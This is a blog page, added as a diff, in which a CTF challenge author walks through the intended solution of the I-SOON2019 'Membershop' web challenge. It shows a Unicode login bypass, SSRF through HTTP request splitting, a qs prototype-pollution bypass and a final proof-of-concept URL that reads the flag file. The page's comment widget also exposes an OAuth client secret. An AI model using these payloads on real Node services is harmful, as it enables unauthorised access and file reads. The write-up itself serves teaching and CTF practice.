@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            I-SOON2019-Membershop出题思路
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <link rel="stylesheet" href="/css/hljs.min.css">
+    <script src="/js/hljs.min.js"></script>  
+    <script src="/js/gitment.browser.js"></script>  
+</head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hpdoger
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Finance behind Passion in Security
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/friends/" class="menu-item-link">
+                        Friends
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/12/01/I-SOON2019-Membershop出题思路/"> 
+                    I-SOON2019-Membershop出题思路 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-12-01   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/小组-学校/">小组/学校</a></li></ul>
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#写在前面"><span class="toc-list-text">写在前面</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#环境搭建"><span class="toc-list-text">环境搭建</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#解题步骤"><span class="toc-list-text">解题步骤</span></a></li></ol>
+</div>
+            <div class="content">
+                <h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>今年是第二年出题，鉴于去年题目过于简单(去年我是真的sb且敷衍)，今年题目我憋了蛮长时间的(狗日的前端)，本希望做到这题的师傅们能有所收获。但是比赛跟各位师傅的时间还是冲突了，加之校赛的局限，实际也没多少人在打。比赛当天下午，Membershop容器的峰值也就5、6个的样子。其实题目并不是很难。</p>
+<p>虽然最后没能达到自己预期的做题效果，算是有点点失望吧。但是我相信D0g3一定能把比赛办出去，感谢运维小哥@0akarma跟我一起调试动态容器的bug，关于全部的题目环境在:<a href="http://dao.ge/isoon2019" target="_blank" rel="noopener">http://dao.ge/isoon2019</a></p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>题目开源地址:<a href="https://github.com/Hpd0ger/My_ctf_challenge/" target="_blank" rel="noopener">https://github.com/Hpd0ger/My_ctf_challenge/</a></p>
+<p>修改index.js的server_ip为环境的ip</p>
+<pre><code>docker-compose build
+docker-compose up -d</code></pre><h1 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h1><p>登陆的时候过滤了admin，同时发现小写字符转换成了大写字母显示。结合set-cookie是koa的框架，很容易联想到后端使用<code>toUpperCase()</code>做转换，拉丁文越权登陆<code>admın</code></p>
+<p><img src="http://static.zybuluo.com/1160307775/uevaveqvu1j6y2trkxfhf08u/image_1dr12lu22vs4iq44id1vuas21m.png" alt="image_1dr12lu22vs4iq44id1vuas21m.png-38.1kB"></p>
+<p>登陆成功之后多了一个请求记录的功能，同时登陆成功后给出源码的地址</p>
+<p><img src="http://static.zybuluo.com/1160307775/vmsnv0pzmurxdz2amugpr9br/image_1dr12phlo1hc31vqi17fvahuhgr16.png" alt="image_1dr12phlo1hc31vqi17fvahuhgr16.png-48.1kB"></p>
+<p>拿到源码后简单看登陆逻辑<br><img src="http://static.zybuluo.com/1160307775/w044ik52f2r0v4qy9dztwfc2/image_1dmbk6vlo19d413cc13h8b108q913.png" alt="image_1dmbk6vlo19d413cc13h8b108q913.png-57.7kB"></p>
+<p>逻辑根据传入的用户名<code>userName</code>会在登陆前经过一次检测<br><img src="http://static.zybuluo.com/1160307775/1sn9fw27548pjpjy0yfishg4/image_1dmbk45jltj28kro9c1kjdkshm.png" alt="image_1dmbk45jltj28kro9c1kjdkshm.png-65.8kB"></p>
+<p>当传入的用户名包含<code>admin</code>时，则自动循环replace掉。在登陆成功的同时会把<code>username</code>写进session里，这里可以看到只有我们登陆了<code>admin</code>才有权限加载其他模版<br><img src="http://static.zybuluo.com/1160307775/8rvxorv0r9e3u03r6vjzyo2u/image_1dmbkcg89ijlmd61vef209bti1g.png" alt="image_1dmbkcg89ijlmd61vef209bti1g.png-160.3kB"></p>
+<p>漏洞点在代码76-117行，它只允许请求以<code>http://127.0.0.1:3000/query</code>(后面拉到本地环境会改127.0.0.1这个地址，这是我本地debug)开头的url。输入其他开头的url会被<code>error url</code>，而且不存在任何host的绕过。当请求之后会被记录在sandbox的results.txt里面并且支持追加，sandbox根据ip建立<br><img src="http://static.zybuluo.com/1160307775/1fkgcdl7j1qc7v6dcjf6tdxm/image_1dmbkrtpt1pkv1q561o9kf2p10hj2n.png" alt="image_1dmbkrtpt1pkv1q561o9kf2p10hj2n.png-28.9kB"><br><img src="http://static.zybuluo.com/1160307775/sl6ii6qt9zm6mj7jrfhsetsp/image_1dmbku3fk399n211cvq49r1emt34.png" alt="image_1dmbku3fk399n211cvq49r1emt34.png-33.7kB"></p>
+<p>因为query也是一个路由，那么这里就存在一个ssrf。如何bypass去请求其他路由呢？只需要用unicode编码并且分割http包，例如</p>
+<pre><code>http://127.0.0.1:3000/query?param=1\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1:3000\u{010D}\u{010A}Connection:\u{0120}keep-alive\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0173}\u{0161}\u{0176}\u{0165}</code></pre><p>url编码是16进制，\u{01xx}在http.get的时候不会进行percent encode，但是在buffer写入的时候会把xx解码。其中<code>\u{0173}\u{0161}\u{0176}\u{0165}</code>代表的是<code>save</code>，73617665是<code>save</code>的16进制表示。具体原理可以看:<a href="https://www.4hou.com/vulnerable/13637.html" target="_blank" rel="noopener">通过拆分请求来实现的SSRF攻击</a></p>
+<p>接着就寻找一下其他路由存在的问题，可利用点在<code>/save</code></p>
+<pre><code>home.get(&#39;/save&#39;,async(ctx)=&gt;{
+    let ip = ctx.request.ip;
+    let reqbody = {switch:false}
+    reqbody = qs.parse(ctx.querystring,{allowPrototypes: false});
+
+    if (ip.substr(0, 7) == &quot;::ffff:&quot;) {
+        ip = ip.substr(7);
+    }
+    if (ip !== &#39;127.0.0.1&#39; &amp;&amp; ip !== server_ip) {
+        ctx.status = 403;
+        ctx.response.body = &#39;403: You are not the local user&#39;;
+    }else {
+        if(reqbody.switch === true &amp;&amp; reqbody.sandbox &amp;&amp; reqbody.opath &amp;&amp;fs.existsSync(reqbody.spath)){
+            if(fs.existsSync(reqbody.sandbox)){
+                paths.opath = fs.readdirSync(reqbody.sandbox)[0];
+            }else if(fs.existsSync(reqbody.opath)){
+                let buffer;
+                tmp[reqbody.sandbox][&#39;opath&#39;] = reqbody.opath;
+                if(/[flag]/.test(tmp[reqbody.sandbox][&#39;opath&#39;])){
+                    buffer = tmp[reqbody.sandbox][&#39;opath&#39;].replace(/f|l|a|g/g,&#39;&#39;);
+                }else{
+                    buffer = reqbody.opath;
+                }
+            }
+            let opath = paths.opath? paths.opath : buffer;
+            let text = fs.readFileSync(opath, &#39;utf8&#39;);
+            await WriteResults(reqbody.spath,text);
+
+        }else{
+            return false;
+        }
+    }
+})</code></pre><p>这里大致有两个障碍点：</p>
+<p>1、限制了本地127.0.0.1访问<br>-&gt;ssrf解决</p>
+<p>2、通过qs包解析url参数存为对象，switch默认为flase，配置<code>allowPrototypes=false</code>，直接传递http参数不能覆盖switch。qs.parse() bypass for prototype pollution@qs&lt;6.3，参考链接:<a href="https://snyk.io/vuln/npm:qs:20170213" target="_blank" rel="noopener">Prototype Override Protection Bypass</a>，传参:<code>]=switch</code>绕过</p>
+<p>3、解析获得的对象需要三个参数sandbox、opath、spath。代码逻辑就是如果存在sandbox那么就取sandbox下的第一个文件(即results.txt)读取后写入spath，否则读取自定义的opath，将结果写入spath(两者前提都是spath必须存在且可写，只有sandbox/result.txt满足要求)。但是自定义opath会替换所有的[flag]字段，不允许直接读flag。</p>
+<p>这里存在判断的绕过。原型链污染sandbox下的一个文件为/flag，再去自定义读到spath里</p>
+<pre><code>tmp[&#39;__proto__&#39;][&#39;opath&#39;] = &#39;/flag&#39;;
+=&gt;
+paths.opath = /flag</code></pre><p>构造一下就能把flag追加写入到sandbox/results.txt。poc如下，调整一下opath为flag地址，sandbox为自己的<code>md5(ip)</code>就行了：</p>
+<pre><code>encodeURI(&quot;http://127.0.0.1:3000/query?param=1\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1:3000\u{010D}\u{010A}Connection:\u{0120}keep-alive\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0173}\u{0161}\u{0176}\u{0165}?]=switch&amp;sandbox=__proto__&amp;opath=/flag&amp;spath=tmp/ab54a5cf83f67d827ecba68e394f9196&quot;)</code></pre>
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Hpdoger</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="https://hpdoger.cn/2019/12/01/I-SOON2019-Membershop出题思路/">https://hpdoger.cn/2019/12/01/I-SOON2019-Membershop出题思路/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+ 
+<li>
+    <img src="/img/wechat.jpg">
+</li>
+
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+<div></div>
+
+    <div class="next">
+    <a href="/2019/11/20/从Kibana-RCE对nodejs子进程创建的思考/"> 从Kibana-RCE对nodejs子进程创建的思考 </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Sun Dec 01 2019 00:00:00 GMT+0800",
+    owner: "Hpd0ger",
+    repo: "Hpd0ger.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/toki.js"></script>  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
